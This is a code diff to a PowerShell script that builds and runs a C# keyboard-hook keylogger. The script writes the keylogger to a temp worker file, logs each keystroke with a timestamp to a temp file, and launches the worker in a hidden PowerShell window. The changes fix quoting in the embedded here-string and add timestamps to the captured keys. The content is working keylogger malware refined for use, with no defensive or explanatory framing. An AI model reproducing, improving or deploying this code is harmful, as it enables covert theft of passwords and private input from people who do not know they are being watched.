@@ -5,9 +5,9 @@ $logFile = "$env:TEMP\keylog_$channelID.txt"
 $pidFile = "$env:TEMP\keylog_pid_$channelID.txt"
 $workerScript = "$env:TEMP\keylog_worker_$channelID.ps1"
 
-# Create the worker script content (contains the actual keylogger)
-$workerContent = @"
-`$cSharpCode = @"
+# Worker script content (contains the actual keylogger)
+$workerContent = @'
+$cSharpCode = @"
 using System;
 using System.Diagnostics;
 using System.IO;
@@ -62,7 +62,8 @@ public class Keylogger
         if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
         {
             int vkCode = Marshal.ReadInt32(lParam);
-            _writer.WriteLine(((Keys)vkCode).ToString());
+            string keyName = ((Keys)vkCode).ToString();
+            _writer.WriteLine($"[{DateTime.Now:HH:mm:ss}] {keyName}");
         }
         return CallNextHookEx(_hookID, nCode, wParam, lParam);
     }
@@ -88,15 +89,16 @@ public class Keylogger
     private static extern IntPtr GetModuleHandle(string lpModuleName);
 }
 "@
-Add-Type -TypeDefinition `$cSharpCode -ReferencedAssemblies "System.Windows.Forms"
-[Keylogger]::Start("$env:TEMP\keylog_$env:ChannelID.txt")
-while(`$true) {
+Add-Type -TypeDefinition $cSharpCode -ReferencedAssemblies "System.Windows.Forms"
+$logFile = "$env:TEMP\keylog_$env:ChannelID.txt"
+[Keylogger]::Start($logFile)
+while($true) {
     Start-Sleep -Seconds 10
 }
-"@
+'@
 
 # Write worker script to temp file
-$workerContent | Out-File -FilePath $workerScript -Encoding UTF8
+$workerContent | Out-File -FilePath $workerScript -Encoding utf8
 
 # Launch worker in hidden PowerShell window
 $psi = New-Object System.Diagnostics.ProcessStartInfo
